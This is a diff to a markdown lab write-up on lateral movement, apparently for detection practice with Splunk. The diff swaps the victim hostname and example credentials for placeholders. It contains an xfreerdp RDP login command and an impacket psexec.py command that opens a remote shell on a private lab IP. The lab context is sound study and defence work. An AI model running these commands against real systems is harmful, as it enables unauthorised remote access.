@@ -30,7 +30,7 @@ This document demonstrates two common lateral movement techniques attackers use 
 
 ## 🧪 Lab Setup
 - **Attacker:** Kali Linux 🐧  
-- **Victim:** Windows 11 VM 💻 (192.168.189.150, CYBERSTAR)  
+- **Victim:** Windows 11 VM 💻   
 - **Monitoring:** Splunk Enterprise 📊 for log analysis
 
 ---
@@ -48,7 +48,7 @@ This document demonstrates two common lateral movement techniques attackers use 
 * **Test Command:**
 
   ```bash
-  xfreerdp /v:192.168.189.150 /u:Dummy /p:Password12345 /cert:ignore /sec:rdp
+  xfreerdp /v:192.168.189.150 /u:user /p:Password /cert:ignore /sec:rdp
   ```
 
 ---
@@ -73,7 +73,7 @@ This document demonstrates two common lateral movement techniques attackers use 
 * **Test Command:**
 
   ```bash
-  python3 /usr/share/doc/python3-impacket/examples/psexec.py CYBERSTAR/Dummy:Password12345@192.168.189.150
+  python3 /usr/share/doc/python3-impacket/examples/psexec.py Domain name/user:Password@192.168.189.150
   ```
 
 ---
